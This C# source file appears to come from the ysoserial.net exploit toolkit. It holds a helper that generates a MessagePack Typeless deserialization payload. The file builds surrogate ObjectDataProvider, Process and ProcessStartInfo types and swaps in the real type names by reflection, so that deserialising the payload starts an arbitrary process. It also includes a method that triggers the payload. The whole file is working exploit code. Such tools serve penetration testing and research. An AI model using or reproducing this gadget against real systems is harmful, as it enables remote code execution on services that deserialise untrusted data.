namespace ysoserial.Helpers
{
    using System;
    using System.Reflection;

    using MessagePack;
    using MessagePack.Formatters;
    using MessagePack.Resolvers;

    using System.Reflection.Emit;
    using System.Runtime.CompilerServices;
    using System.Collections.Generic;

    /// <summary>
    /// Helper methods for generating an ObjectDataProvider gadget with MessagePack (Typeless)
    /// </summary>
    internal static class MessagePackObjectDataProviderHelper
    {
        /// <summary>
        /// Creates a serialized ObjectDataProvider gadget that when deserialized will execute the specified command.
        /// </summary>
        /// <param name="pCmdFileName">The command filename.</param>
        /// <param name="pCmdArguments">The command arguments.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        /// <returns>The serialized byte array.</returns>
        internal static byte[] CreateObjectDataProviderGadget(string pCmdFileName, string pCmdArguments, bool pUseLz4)
        {
            CreateDynamicGadgetSurrogateTypes(out Type odpType, out Type procType, out Type psiType);

            SwapTypeCacheNames(
                new Dictionary<Type, string>
                {
                    { odpType, "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" },
                    { procType, "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" },
                    { psiType, "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" }
                });

            var odpInstance = CreateObjectDataProviderSurrogateInstance(odpType, procType, psiType, pCmdFileName, pCmdArguments);

            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            return MessagePackSerializer.Serialize(odpInstance, options);
        }

        /// <summary>
        /// Tests the deserialization of a serialized object.
        /// </summary>
        /// <param name="pSerializedData">The serialized data.</param>
        /// <param name="pUseLz4">Flag to use Lz4 compression. This works with both Lz4Block and Lz4BlockArray.</param>
        internal static void Test(byte[] pSerializedData, bool pUseLz4)
        {
            MessagePackSerializerOptions options = pUseLz4
                ? TypelessContractlessStandardResolver.Options.WithCompression(MessagePackCompression.Lz4BlockArray)
                : TypelessContractlessStandardResolver.Options;

            MessagePackSerializer.Deserialize<object>(pSerializedData, options);
        }

        /// <summary>
        /// Utilizes reflection to add values to the internal FullTypeNameCache that MessagePack uses to acquire cached type names for serialization.
        /// This allows us to swap our surrogate ObjectDataProvider gadget type information with the real gadget AQNs when serialized.
        /// </summary>
        /// <param name="pNewTypeCacheEntries">
        /// The dictionary of type name cache entries to swap. 
        ///     Key = The type that the serializer has found.
        ///     Value = The real gadget type AQN string which we want to use instead of the surrogate type AQN.
        /// </param>
        private static void SwapTypeCacheNames(IDictionary<Type, string> pNewTypeCacheEntries)
        {
            FieldInfo typeNameCacheField = typeof(TypelessFormatter).GetField("FullTypeNameCache", BindingFlags.NonPublic | BindingFlags.Static);
            object typeNameCache = typeNameCacheField.GetValue(TypelessFormatter.Instance);

            MethodInfo method = typeNameCacheField.FieldType.GetMethod("TryAdd", new[] { typeof(Type), typeof(byte[]) });

            foreach (var typeSwap in pNewTypeCacheEntries)
            {
                method.Invoke(typeNameCache,
                    new object[]
                    {
                        typeSwap.Key,
                        System.Text.Encoding.UTF8.GetBytes(typeSwap.Value)
                    });
            }
        }

        /// <summary>
        /// Creates the dynamic types that will be used in the ObjectDataProvider surrogate object graph.
        /// </summary>
        /// <param name="pOdpTypeId">The type of the ObjectDataProvider surrogate.</param>
        /// <param name="pProcTypeId">The type of the Process surrogate.</param>
        /// <param name="pPsiTypeId">The type of the ProcessStartInfo surrogate.</param>
        private static void CreateDynamicGadgetSurrogateTypes(out Type pOdpType, out Type pProcType, out Type pPsiType)
        {
            AssemblyBuilder gadgetSurrogateAssembly = AssemblyBuilder.DefineDynamicAssembly(new AssemblyName("GadgetSurrogateAssembly"), AssemblyBuilderAccess.Run);

            ModuleBuilder procModBuilder = gadgetSurrogateAssembly.DefineDynamicModule("ProcessModule");
            ModuleBuilder odpModBuilder = gadgetSurrogateAssembly.DefineDynamicModule("ObjectDataProviderModule");

            TypeBuilder psiTypeBuilder = procModBuilder.DefineType("ProcessStartInfo", TypeAttributes.Public | TypeAttributes.Class);
            DefineGetSetProperty(psiTypeBuilder, "FileName", typeof(string));
            DefineGetSetProperty(psiTypeBuilder, "Arguments", typeof(string));

            TypeBuilder procTypeBuilder = procModBuilder.DefineType("Process", TypeAttributes.Public | TypeAttributes.Class);
            DefineGetSetProperty(procTypeBuilder, "StartInfo", procModBuilder.GetType("ProcessStartInfo"));

            TypeBuilder odpTypeBuilder = odpModBuilder.DefineType("ObjectDataProvider", TypeAttributes.Public | TypeAttributes.Class);
            DefineGetSetProperty(odpTypeBuilder, "MethodName", typeof(string));
            DefineGetSetProperty(odpTypeBuilder, "ObjectInstance", typeof(object));

            pOdpType = odpTypeBuilder.CreateType();
            pProcType = procTypeBuilder.CreateType();
            pPsiType = psiTypeBuilder.CreateType();
        }

        /// <summary>
        /// Creates a populated surrogate ObjectDataProvider instance which matches the object graph of the real ObjectDataProvider gadget.
        /// </summary>
        /// <param name="pOdpType">The type of the ObjectDataProvider surrogate.</param>
        /// <param name="pProcType">The type of the Process surrogate.</param>
        /// <param name="pPsiType">The type of the ProcessStartInfo surrogate.</param>
        /// <param name="pCmdFileName">The command filename.</param>
        /// <param name="pCmdArguments">The command arguments.</param>
        /// <returns>The full ObjectDataProvider surrogate object graph.</returns>
        private static object CreateObjectDataProviderSurrogateInstance(Type pOdpType, Type pProcType, Type pPsiType, string pCmdFileName, string pCmdArguments)
        {
            object psiInstance = Activator.CreateInstance(pPsiType);
            pPsiType.GetProperty("FileName").SetValue(psiInstance, pCmdFileName);
            pPsiType.GetProperty("Arguments").SetValue(psiInstance, pCmdArguments);

            object procInstance = Activator.CreateInstance(pProcType);
            pProcType.GetProperty("StartInfo").SetValue(procInstance, psiInstance);

            object odpInstance = Activator.CreateInstance(pOdpType);
            pOdpType.GetProperty("MethodName").SetValue(odpInstance, "Start");
            pOdpType.GetProperty("ObjectInstance").SetValue(odpInstance, procInstance);

            return odpInstance;
        }

        /// <summary>
        /// Helper method for generating a basic Get/Set property with a backing field.
        /// Note: The CompilerGeneratedAttribute is set to prevent MessagePack from serializing the backing fields.
        /// </summary>
        /// <param name="pTypeBuilder">The type builder.</param>
        /// <param name="pPropertyName">The name of the property.</param>
        /// <param name="pPropertyType">The type of the property.</param>
        private static void DefineGetSetProperty(TypeBuilder pTypeBuilder, string pPropertyName, Type pPropertyType)
        {
            PropertyBuilder propBuilder = pTypeBuilder.DefineProperty(pPropertyName, PropertyAttributes.None, pPropertyType, null);

            FieldBuilder fieldBuilder = pTypeBuilder.DefineField("_" + pPropertyName, pPropertyType, FieldAttributes.Private);
            CustomAttributeBuilder attrBuilder = new CustomAttributeBuilder(typeof(CompilerGeneratedAttribute).GetConstructor(Type.EmptyTypes), new object[0]);
            fieldBuilder.SetCustomAttribute(attrBuilder);

            MethodBuilder getMethodBuilder = pTypeBuilder.DefineMethod(
                "get_" + pPropertyName,
                MethodAttributes.Public | MethodAttributes.SpecialName | MethodAttributes.HideBySig,
                pPropertyType,
                Type.EmptyTypes
            );

            ILGenerator getMethodIL = getMethodBuilder.GetILGenerator();
            getMethodIL.Emit(OpCodes.Ldarg_0);
            getMethodIL.Emit(OpCodes.Ldfld, fieldBuilder);
            getMethodIL.Emit(OpCodes.Ret);

            MethodBuilder setMethodBuilder = pTypeBuilder.DefineMethod(
                "set_" + pPropertyName,
                MethodAttributes.Public | MethodAttributes.SpecialName | MethodAttributes.HideBySig,
                null,
                new Type[] { pPropertyType }
            );

            ILGenerator setMethodIL = setMethodBuilder.GetILGenerator();
            setMethodIL.Emit(OpCodes.Ldarg_0);
            setMethodIL.Emit(OpCodes.Ldarg_1);
            setMethodIL.Emit(OpCodes.Stfld, fieldBuilder);
            setMethodIL.Emit(OpCodes.Ret);

            propBuilder.SetGetMethod(getMethodBuilder);
            propBuilder.SetSetMethod(setMethodBuilder);
        }
    }
}
